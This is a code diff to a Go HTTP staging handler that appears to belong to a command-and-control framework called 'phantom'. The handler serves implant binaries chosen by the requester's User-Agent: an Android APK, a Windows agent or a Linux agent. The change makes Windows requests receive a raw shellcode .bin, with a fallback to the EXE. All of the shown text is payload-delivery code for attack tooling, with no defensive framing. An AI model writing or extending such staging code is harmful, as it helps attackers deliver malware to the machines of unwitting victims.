@@ -378,15 +378,17 @@ func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
 	if strings.Contains(ua, "Android") {
 		agentPath = filepath.Join(root, "build", "payloads", "phantom-android.apk")
 	} else if strings.Contains(ua, "Windows") || strings.Contains(ua, "Win64") || strings.Contains(ua, "Win32") || strings.Contains(ua, "WNS") || strings.Contains(ua, "PWSH") {
-		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
+		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.bin")
 	} else {
 		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
 	}
 
 	agentBinary, err := os.ReadFile(agentPath)
 	if err != nil {
-		// Try the other OS as fallback
-		if strings.Contains(agentPath, "windows") {
+		// Fallback: raw EXE if shellcode isn't built yet, else other OS
+		if strings.Contains(agentPath, ".bin") {
+			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
+		} else if strings.Contains(agentPath, "windows") {
 			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
 		} else {
 			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
